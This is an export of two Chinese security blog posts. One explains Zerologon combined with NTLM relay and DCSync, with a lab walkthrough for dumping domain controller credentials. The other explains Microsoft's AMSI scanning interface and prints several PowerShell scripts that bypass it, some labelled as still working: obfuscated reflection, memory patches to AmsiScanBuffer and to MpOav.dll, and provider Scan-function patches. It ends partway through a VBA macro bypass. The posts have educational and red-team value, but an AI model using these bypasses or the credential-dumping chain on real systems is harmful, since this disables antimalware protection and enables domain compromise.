[{"title":"NTLM中继+Zerologon漏洞利用的方法","path":"NTLM中继+Zerologon漏洞利用的方法/","text":"首发蛇矛实验室：https://mp.weixin.qq.com/s/TAuKYcMU9Kgfc0cp8RwO0A 无需重置计算机帐户即可利用 Zerologon 的方法 什么是Netlogon 协议？在Active Directory中比较重要的一个服务：”Netlogon”服务，此服务在DC和域成员服务器上运行，为域身份验证提供重要服务，如果此服务停止成员服务器将无法登陆到域中。 客户端和认证服务器之间建立一个基于NETLOGON协议的安全会话有两个目的：一是用于认证；二是用于交换通信秘钥SessionKey。 Netlogon 认证过程简单来说就是是让客户端 （域内计算机）和服务器(域控制器)向分别对方证明他们都知道一个共同的秘密。此共享秘密是客户端计算机帐户密码的散列（其实就是NTLM）。 Netlogon协议身份验证握手过程详细说可以分为以下几个步骤： 客户端启动Netlogon会话，客户端和认证服务器通过该会话相互交换随机生成的8字节挑战（挑战就是一个随机数）。 客户端和认证服务器，同时使用密钥派生函数（KDF全称Key derivation function）将两个挑战与共享秘密（NTLM）混合来计算出SessionKey。SessionKey&#x3D;KDF（NTLM，client challenge+server challenge），如果客户端和认证服务器使用的NTLM相同的话，客户端和认证服务器就拥有同一个SessionKey了，这一步是认证的基础。 客户端使用SessionKey和客户端挑战使用AES-CFB8算法加密后结果A1发给服务端，然后认证服务器内部使用同样的算法AES-CFB8算法生成A2，如果A1等于A2，那么认证服务器就知道客户端是知道NTLM的，然后客户端在服务器这里就认证通过了。同理，认证服务器使用SessionKey和服务端挑战加密后结果B1发给客户端，客户端内部使用同样的方法生成B2，如果B1等于B2，那么客户端就知道了服务端是知道NTLM的。到这里认证过程就结束了，双方互相认证了对方的身份；同时协商出来了一个加密密钥SessionKey，这样客户端和认证服务器后续的所有消息都使用SessionKey来加密，然后SessionKey来解密对方的消息。 这个过程如下图所示： ZeroLogon(CVE-2020-1472) 漏洞原理与风险该漏洞存在一个加密缺陷，其中对于每256个随机生成的密钥中的1个，对由所有0组成的纯文本进行加密将导致也包含所有0的密文。简单来说就是通过将Client challenge置为0的方式来碰撞密文client credential为0的情况，不断重复这个过程直至服务器那端计算出来的密文hash也全是0，从而可以绕过认证过程。详情可以查看ZeroLogon(CVE-2020-1472) 分析与狩猎（https://xz.aliyun.com/t/8367）。 Netlogon协议在Active Directory中主要由工作站和服务器使用，以通过安全通道与域控制器进行通信。因为加入Active Directory的每个工作站或服务器都有一个计算机帐户，Active Directory知道该帐户的密码。Active Directory拥有多个从同一密码派生的密钥，这些密钥可用于Kerberos和NTLM等身份验证协议。 最初的Zerologon攻击的工作原理是将域中域控制器的Active Directory帐户的密码重置为空字符串。这允许攻击者以该域控制器的身份向另一个域控制器甚至同一域控制器进行身份验证。能够以域控制器身份进行身份验证是一项高权限，因为域控制器可以使用DRSUAPI协议同步Active Directory数据，包括NT哈希和Kerberos密钥。反过来，这些密钥可用于模拟域中的任何用户，或创建伪造的 Kerberos 票证。 这其实是有风险的。在Active Directory中重置域控制器计算机帐户密码为空的那一刻，DC 处于不一致状态。因为存储在注册表和内存lsass.exe中的加密计算机帐户密码不会更改。Active Directory中同一帐户的密码现在已更改，这将影响从此域控制器到此域控制器的身份验证。如果重新启动域控制器，则各种服务将不再启动，因为它们想要从Active Directory读取信息。如果执行漏洞利用的速度足够快，则可以从注册表中恢复原始密码，但是任然有风险，这就是为什么不建议在生产环境中利用它的原因。 什么是NTLM中继？NTLM协议的认证过程分为三步： 协商：主要用于确认双方协议版本。 质询：就是挑战（Chalenge）&#x2F;响应（Response）。 验证：验证主要是在质询完成后，验证结果，是认证的最后一步。 NTLM协议的认证过程如下图所示： 应用服务器在收到用户客户端的认证信息后，由于本身没有存储用户的NT哈希，所以必须依赖域服务器进行认证，将收到的认证信息发送给域服务器，这个过程基于NETLOGON协议。服务器使用 Netlogon RPC 协议将身份验证消息发送到域控制器，该协议将此会话密钥（SessionKey）返回给服务器。如下图所示。 NTLM中继攻击（NTLM Relay）本质上是中间人的利用手法：欺骗客户端向自己发起认证，自己再将完整认证过程转发给服务端，达到绕过挑战响应认证直接获取服务端权限的目的。 攻击者让客户端向攻击者服务器发起 NTLM 请求 攻击者服务器将客户端的NTLM 请求转发给真实服务器，真实服务端返回challenge 攻击者服务器将收到的challenge转发送给客户端 客户端返回response，攻击者服务器将response转发送给服务端 服务端验证通过，攻击者服务器获得服务端权限 如下图所示： 由此可以得知，如果攻击者控制了任何一台域内主机（域内主机均具有自身主机账号的口令NTLM值），只要能获取此前客户端请求用户发送给应用服务器的认证信息，攻击者就可以向域服务器发起NETLOGON会话，从而获取SessionKey，随后可以发起重放攻击。 什么是DCSync不同域控制器（DC）之间，每15分钟都会有一次域数据的同步。当一个域控制器（DC1）想从其他域控制器（DC2）获取数据时，DC1会向DC2发起一个GetNCChanges请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过DirectoryReplicationService（DRS）服务的GetNCChanges接口向域控发起数据同步请求。 在默认情况下，只有Administrators、Domain Controllers和Enterprise Domain Admins组内的用户有权限使用DCSync。 以前获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。DCSync的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。 NTLM中继+Zerologon在Active Directory中，有两种主要身份验证协议：NTLM和Kerberos。Kerberos是去中心化的，基于加密和共享机密工作。NTLM是中心化的，如果使用域帐户认证，则需要与域控制器通信才能工作。这是因为NTLM使用质询-响应身份验证机制，其中对服务器发送的质询执行加密操作，以证明用户拥有其密码（或确切地说是其密码的哈希版本）。对于ActiveDirectory帐户，服务器实际上并不知道尝试进行身份验证的用户的密码是什么，因此它会将其转发给域控制器，域控制器会告诉服务器响应是否适合给定的质询。这种转发实际上是通过Netlogon协议完成的，其中存在Zerologon漏洞。 NTLM协议的一个弱点是，如果攻击者可以诱使用户使用NTLM向他们进行身份验证，则他们可以将身份验证消息转发到其他服务器并模拟此服务器上的用户，这被称为NTLM中继。 “打印机错误”功能允许攻击者通过NTLM触发任何启用了后台处理服务的计算机的身份验证，还可以通过使计算机帐户向攻击者的IP地址而不是主机名进行身份验证来强制使用NTLM进行身份验证，从而使其使用NTLM而不是Kerberos来认证，这为NTLM中继提供了触发条件。 NTLM协议执行身份验证时对消息进行签名和加密的加密密钥称为SessionKey，SessionKey是基于用户的NT哈希和协议中协商的某些属性生成的。这意味着为了计算SessionKey，服务器需要拥有用户的NT哈希。除非服务器是域控制器，否则它不具有该NT哈希。因此，服务器会使用NetlogonRPC协议将身份验证消息发送到域控制器，该协议将此会话密钥返回给服务器。 我们可以使用中继连接直接向DRSUAPI协议的RPC端点进行身份验证，虽然该协议需要签名和加密，但我们可以使用Zerologon获取SessionKey，并遵守与该协议通信的所有加密要求。 所有这些结合在一起，我们有一个全新的攻击，它不依赖于重置机器帐户的密码来利用。它确实具有原始攻击所没有的一些先决条件，尽管这些先决条件默认存在，并且可能在大多数AD中起作用： 触发打印机bug需要一个帐户 打印后台处理程序服务应在DC上运行 DC应该容易受到Zerologon的攻击 域中至少应有2个DC，因为中继回同一DC不起作用 最终流程如下图所示： 攻击实践实验环境 机器名 ip地址 角色 DC 192.168.50.10 主域控：dc.rangenet.cn DC2 192.168.50.15 辅助域控：dc2.rangenet.cn win10 192.168.50.16 域成员、登录账号为域内用户user（密码为Admin@123） kali 192.168.50.20 攻击者 Zerologon漏洞漏洞复现这里使用poc直接验证，如下图所示，证明DC1存在zerologon漏洞，并且成功dump出域控hash。 NTLM中继+Zerologon环境搭建接下来恢复快照，恢复DC到zerologon利用之前的快照。 然后搭建DC2 1.先设置DNS为DC的ip 2.加入域rangenet.cn，同时将计算机名改成dc2。 3.重启之后搭建域环境 选择Active Directory 域服务，然后将此服务器提升为域控制器。这个过程相比大家都比较熟，这里就简化步骤了，只截图关键部分。 选择将域控制器添加到现有域，然后更改操作所需凭据，凭据为主域控DC的账号密码。后面都是下一步就完了，之后会重启，重启之后输入的是主域控DC的账号密码。 这样在同一个域(rangenet.cn)中就会有两个域控，接下来将两个域控互相设为备份。 4.互相设置DNS名称服务器 进入主域控DC，然后打开DNS管理器。在正向查找区域中找到rangenet.cn，然后右键选择属性，选择名称服务器选项卡，然后添加新的名称服务器。 然后将备域控DC2的域名和ip填进去。 进入DC2，做同样的操作，将DC的名称服务器添加进去。 这样主域控DC和备域控DC2就互相冗余了。 漏洞复现因为DC和DC2互为主备，所以随便选一个进入，然后创建一个普通域用户user。这个普通域用户user是用于win10域成员登录的。 假设我们事先拿下了win10域成员，然后在win10上拿到了rangenet&#x2F;user的账号密码。 1.在kali上开启NTLM中继，中继目标是主域控DC，中继成功之后直接执行DCSYNC来dump域控凭据。脚本会同时开启SMB、HTTP、WCF、WAW服务用来执行NTLM中继。 2.在使用printbug攻击DC2，使DC2强制使用NTLM登录kali，这样kali就能通过NTLM中继拿到sessionkey。 3.通过NTLM中继+zerologon漏洞组合利用，模拟DC2$机器账户的身份，使用zerologon绕过NETLOGON协议认证，然后使用窃取到session key，再调用DRSUAPI执行DCSYNC操作，以DC2$的身份向DC请求同步凭据，然后域内凭据就被dump出来了。 之后凭据可以用来登录任意域控或域成员。 总结：这是一种无须重置域控密码即可使用zerologon漏洞攻击域控或提权的方法，但是利用条件又比直接zerologon漏洞攻击多出了许多。利用条件需要双域控同时需要一个域成员账号密码，但是没有重置密码的风险。 zerologon漏洞只需要域控主机名和ip即可利用，利用条件简单，但是一旦将域控密码置空就会造成域控脱域。因为在Active Directory中重置域控制器计算机帐户密码为空的那一刻，DC 处于不一致状态。因为存储在注册表和内存lsass.exe中的加密计算机帐户密码不会更改，但是Active Directory中同一帐户的密码现在已更改，这将影响从此域控制器到此域控制器的身份验证。如果重新启动域控制器，则各种服务将不再启动，因为它们想要从Active Directory读取信息。","tags":[{"name":"NTLM","slug":"NTLM","permalink":"https://mrwq.github.io/tags/NTLM/"},{"name":"ZeroLogon","slug":"ZeroLogon","permalink":"https://mrwq.github.io/tags/ZeroLogon/"},{"name":"CVE","slug":"CVE","permalink":"https://mrwq.github.io/tags/CVE/"}]},{"title":"AMSI绕过原理与实践","path":"AMSI绕过原理与实践/","text":"1.什么是AMSIAMSI全称(Antimalware Scan Interface)，反恶意软件扫描接口 反恶意软件扫描接口是允许应用程序与反恶意软件产品集成的标准 例如，在可编写脚本的应用程序中，当脚本准备好提供给脚本引擎时，应用程序可以调用Windows AMSI API，请求在执行之前扫描内容。 AMSI有效的原因是，无论代码经过多么复杂的模糊处理和混淆，当脚本需要在脚本宿主中运行时，都必须是明文未经混淆的代码形式执行。比如powershell代码，无论经过多复杂的模糊处理或者编码（比如Base64），但是当需要执行powershell代码是必须要解码之后符合powershell代码规范才能执行。 2.AMSI架构任何应用程序（消费者）都可以请求扫描内容 任何安全供应商（供应商）都可以注册以接收扫描请求 操作系统是中介程序amsi.dll，必须由任何受amsi保护的应用程序导入 3.受AMSI影响的产品PowerShell (&gt;2.0) JavaScript VBScript VBA (office macro) WMI User Account Control (UAC)elevations Excel 4.0 macros Volume shadow copy operations .NET in-memory assembly loads 4.AMSI函数语法参数等详细信息可以查看微软官方文档https://learn.microsoft.com/en-us/windows/win32/api/amsi/ 函数名 作用 AmsiCloseSession 关闭由 AmsiOpenSession 打开的会话。 AmsiInitialize 初始化 AMSI API。 AmsiNotifyOperation 向反恶意软件提供程序发送任意操作的通知。 AmsiOpenSession 打开可在其中关联多个扫描请求的会话。 AmsiResultIsMalware 确定扫描结果是否指示应阻止内容。 AmsiScanBuffer 扫描缓冲区中的内容中寻找恶意软件。 AmsiScanString 扫描字符串中的恶意软件。 AmsiUninitialize 删除 AmsiInitialize最初打开的 AMSI API 实例。 5.禁用AMSI断开AMSI链条中的任何一个环节 5.1.应用程序侧的Unhook各种应用程序是通过AMSI这个接口被检测的，可以通过断开某个应用程序（比如powershell）到AMSI的路线来使这个应用程序（比如powershell）不被AMSI扫描，从而绕过AMSI。 取决于受AMSI保护的应用程序如何使用AMSI，了解应用程序的工作原理，使其在不调用AmsiScanBuffer的情况下执行代码。 5.1.1使用反射首先了解powershell是如何调用AMSI的 powershell可以通过反射破坏Amsi的初始化相关对象(amsiInitFailed、amsiSession、amsiContext)，使其不能正常初始化，从而不对当前进程进行扫描。 （这是2016年提出的概念脚本，现在AMSI会识别并拦截了） 12345[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiInitFailed&quot;,&quot;NonPublic,Static&quot;).SetValue($null,$true)[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null,$null);$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;, &quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem) 改变上面的第一个脚本，使用base64绕过（此脚本也已经失效） 1[Ref].Assembly.GetType(&#x27;System.Management.Automation.&#x27;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;))),&#x27;NonPublic,Static&#x27;).SetValue($null,$true) 再次修改脚本，全部使用base64绕过（目前可用） 123456789function b64decode &#123; param ($encoded) $decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) return $decoded &#125; $1 = b64decode(&quot;U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=&quot;) $2 = b64decode(&quot;YW1zaUluaXRGYWlsZWQ=&quot;) $3 = b64decode(&quot;Tm9uUHVibGljLFN0YXRpYw==&quot;)[Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true) 最终绕过AMSI效果如下： （同样有效的脚本） 1234$w = &#x27;System.Management.Automation.A&#x27;;$c = &#x27;si&#x27;;$m = &#x27;Utils&#x27;$assembly = [Ref].Assembly.GetType((&#x27;&#123;0&#125;m&#123;1&#125;&#123;2&#125;&#x27; -f $w,$c,$m))$field = $assembly.GetField((&#x27;am&#123;0&#125;InitFailed&#x27; -f $c),&#x27;NonPublic,Static&#x27;)$field.SetValue($null,$true) 5.2.patch AMSI.DLL代码AMSI的一个主要组件被实现为DLL，该DLL被加载到每个受AMSI保护的进程中，此DLL充当托管PowerShell代码和COM反恶意软件提供程序之间的连接器。因此通过修补AMSI.DLL的代码\\数据部分，攻击者可以破坏AMSI链。 5.2.1patch AmsiScanBuffer函数AmsiScanBuffer()函数扫描充满恶意软件内容的缓冲区，攻击者可以修补AmsiScanBuffer的任何部分（或其调用的其他代码片段），并根据其意愿使其返回AMSI_RESULT值。 （下面示例代码目前可用） 1234567891011121314151617181920$Win32 = @&quot;using System;using System.Runtime.InteropServices;public class Win32 &#123; [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);&#125;&quot;@Add-Type $Win32$LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;)$Address = [Win32]::GetProcAddress($LoadLibrary,&quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;)$p = 0[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) #E_INVALIDARG [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) 为什么$Patch &#x3D; [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)？ 这是因为在64位下HRESULT:0x80070057 (E_INVALIDARG)的字节码是0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3。而E_INVALIDARG代表传入的参数之一无效。当AmsiScanBuffer因为参数错误而导致返回代码是E_INVALIDARG时，实际扫描结果为 0 即AMSI_RESULT_CLEAN。 详细说明可以去查看这个链接：https://rastamouse.me/memory-patching-amsi-bypass/ 5.2.2patch AMSI Context 结构体AMSI Context 结构体在AmsiInitialize例程期间初始化，存储在AMSI保护的进程内存中，可以通过搜索“AMSI”签名在内存中找到AMSI Context 结构体或找到指向它的全局指针，覆盖此结构将导致AmsiScanBuffer失效。 5.3.COM Server劫持AMSI提供程序通过在HKLM\\Software\\Classes\\CLSID中创建CLSID条目并在HKLM\\SSoftware\\Microsoft\\AMSI\\providers中注册相同的CLSID来注册自己。当AMSI在主机进程中初始化时，它将枚举Providers注册表项中列出的每个CLSID，并通过导入InProcServer32子项中的DLL来初始化COM对象。 有关CLSID可查阅微软文档：https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm IAntimalwareProvider是构成AMSI主要关键的接口。想要提供反恶意软件服务的每个AMSI提供程序都需要实现lAntimalwareProvider COM接口。 劫持AMSI提供程序COM服务器可能导致绕过AMSI，而且可通过注册表监控轻松检测。 5.4.patch AMSI提供程序这种方法将导致AMSI初始化过程失败，从而破坏AMSI链。通过修补amsi.dll区域外的非受监控内存来完成 为了理解它，让我们深入到AMSI内部 AMSI Initialization 任何想要使用AMSI服务的提供商都必须调用Amsilnitialize函数，用信息填充HAMSICONTEXT。下面是简化的代码 我们会破坏一些不太直观的东西来保护提供程序本身，修补提供程序的DLL中DllGetClassObject函数的序言字节，并干扰AMSI的初始化过程。 AmsiUninitialize 每个使用AMSI的应用程序都有一个代码，用于取消初始化AMSI，那就是AmsiUninitialize函数。在PowerShell中，我们可以使用反射来调用此代码。在AmsiUtils类中声明一个名为Uninitialize()的函数，为我们取消初始化AMSI。 5.4.1Patch Microsoft MpOav.dll基于此原理可以得到一个bypass脚本，下面是一个示例patch Microsoft提供程序的DLL（MpOav.DLL），可以通过适当的查询注册表项来查找所有提供程序的DLL。 其它使用AMSI厂商的可以查看这个链接: https://github.com/subat0mik/whoamsi （下面示例代码目前仍然有效） 123456789101112131415161718192021222324$APIs = @&quot;using System;using System.Runtime.InteropServices;public class APIs &#123; [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);&#125;&quot;@Add-Type $APIs$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)$LoadLibrary = [APIs]::LoadLibrary(&quot;MpOav.dll&quot;)$Address = [APIs]::GetProcAddress($LoadLibrary, &quot;DllGetClassObject&quot;)$p = 0[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)$object = [Ref].Assembly.GetType(&#x27;System.Management.Automation.Ams&#x27;+&#x27;iUtils&#x27;)$Uninitialize = $object.GetMethods(&quot;NonPublic,static&quot;) | Where-Object Name -eq Uninitialize$Uninitialize.Invoke($object,$null) 5.4.2替换Add-Type Patch Microsoft MpOav.dllAdd-Type会将代码写入磁盘上的临时文件，然后使用csc.exe 将此代码编译为二进制文件，落地到磁盘上可能导致AV检测 解决方案：反射 Add-Type绕过脚本可以参考: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass (下面的示例代码是使用反射来代替Add-Type) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970function Get-ProcAddress &#123; Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Module, [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure ) # Get a reference to System.dll in the GAC $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125; $UnsafeNativeMethods = $SystemAssembly.GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) # Get a reference to the GetModuleHandle and GetProcAddress methods $GetModuleHandle = $UnsafeNativeMethods.GetMethod(&#x27;GetModuleHandle&#x27;) $GetProcAddress = $UnsafeNativeMethods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])) # Get a handle to the module specified $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module)) $tmpPtr = New-Object IntPtr $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle) # Return the address of the function return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))&#125;function Get-DelegateType&#123; Param ( [OutputType([Type])] [Parameter( Position = 0)] [Type[]] $Parameters = (New-Object Type[](0)), [Parameter( Position = 1 )] [Type] $ReturnType = [Void] ) $Domain = [AppDomain]::CurrentDomain $DynAssembly = New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;) $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false) $TypeBuilder = $ModuleBuilder.DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $ConstructorBuilder = $TypeBuilder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $Parameters) $ConstructorBuilder.SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $MethodBuilder = $TypeBuilder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $ReturnType, $Parameters) $MethodBuilder.SetImplementationFlags(&#x27;Runtime, Managed&#x27;) Write-Output $TypeBuilder.CreateType()&#125;$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,$LoadLibraryDelegate)$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,$GetProcAddressDelegate)$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,$VirtualProtectDelegate)$hModule = $LoadLibrary.Invoke(&quot;MpOav.dll&quot;)$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,&quot;DllGetClassObject&quot;)$p = 0$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) $ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)$object = [Ref].Assembly.GetType(&#x27;System.Ma&#x27;+&#x27;nag&#x27;+&#x27;eme&#x27;+&#x27;nt.Autom&#x27;+&#x27;ation.A&#x27;+&#x27;ms&#x27;+&#x27;iU&#x27;+&#x27;ti&#x27;+&#x27;ls&#x27;)$Uninitialize = $object.GetMethods(&#x27;N&#x27;+&#x27;onPu&#x27;+&#x27;blic,st&#x27;+&#x27;at&#x27;+&#x27;ic&#x27;) | Where-Object Name -eq Uninitialize$Uninitialize.Invoke($object,$null) 5.4.3扫描拦截我们可以拦截AMSIs扫描过程而不是初始化（如经典AmsiScanBuffer patch代码，可以不需要接触amsi.dl就可以完成） AmsiScanBuffer为每个注册的AMSI提供程序调用IAntimalwareProvider::Scan() 如果提供程序返回的结果不是AMSI_RESULT_NOT_DETECTED \\ AMSI_RESULT_CLEAN，则扫描将停止并返回结果，而不调用其余提供程序，比如：AmsiScanBuffer、CAmsiBufferStream、CAmsiAntimalware::Scan。 所以需要找到提供商的扫描函数 调用AmsiInitialize将为我们生成一个新的HAMSICONTEXT，然后将它指向提供程序DLL中的相同扫描函数，我们可以修补每个提供商的 scan函数，所以它将返回而不填写AMSI_RESULT（将保持AMSI_RESULT_CLEAN）。 （下面的示例代码目前仍然可用） 123456789101112131415161718192021222324252627282930313233343536$Apis = @&quot;using System;using System.Runtime.InteropServices;public class Apis &#123; [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); [DllImport(&quot;amsi&quot;)] public static extern int AmsiInitialize(string appName, out Int64 context);&#125;&quot;@Add-Type $Apis$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)$p = 0; $i = 0$SIZE_OF_PTR = 8[Int64]$ctx = 0[Apis]::AmsiInitialize(&quot;MyScanner&quot;, [ref]$ctx)$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)# Loop through all the providerswhile ($AntimalwareProvider -ne 0)&#123; # Find the provider&#x27;s Scan function $AntimalwareProviderVtbl = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider) $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24) # Patch the Scan function Write-host &quot;[$i] Provider&#x27;s scan function found!&quot; $AmsiProviderScanFunc [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p) [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6) $i++ $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))&#125; 5.5 更多AMSI bypass技术5.5.1 使用PowerShell版本2切换powershell版本：powershell -version 2 在脚本中：在脚本开头加入 #requires -version 2 这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版 本执行 5.5.3 amsi.dll劫持LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll，因此可以在 powershell.exe同目录下（C:\\Windows\\System32\\WindowsPowerShell\\v1.0）放一个伪造amsi.dll，就可以实现DLL劫持，而不会调用系统的amsi.dll（C:\\Windows\\System32\\asmi.dll） dll导入优先级如下： 123456进程对应的应用程序所在目录系统目录（通过 GetSystemDirectory 获取）16位系统目录Windows目录（通过 GetWindowsDirectory 获取）当前目录PATH环境变量中的各个目录 5.5.4 宏代码绕过AMSI详细说明可查阅：https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtrPrivate Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtrPrivate Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub ByteSwapper Lib &quot;kernel32.dll&quot; Alias &quot;RtlFillMemory&quot; (Destination As Any, ByVal Length As Long, ByVal Fill As Byte) Declare PtrSafe Sub Peek Lib &quot;msvcrt&quot; Alias &quot;memcpy&quot; (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long) Private Declare PtrSafe Function CreateProcess Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPrivate Declare PtrSafe Function OpenProcess Lib &quot;kernel32.dll&quot; (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As LongPrivate Declare PtrSafe Function TerminateProcess Lib &quot;kernel32&quot; (ByVal hProcess As Long, ByVal uExitCode As Long) As LongPrivate Declare PtrSafe Function CloseHandle Lib &quot;kernel32&quot; (ByVal hObject As Long) As Long Private Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As LongEnd Type Private Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long 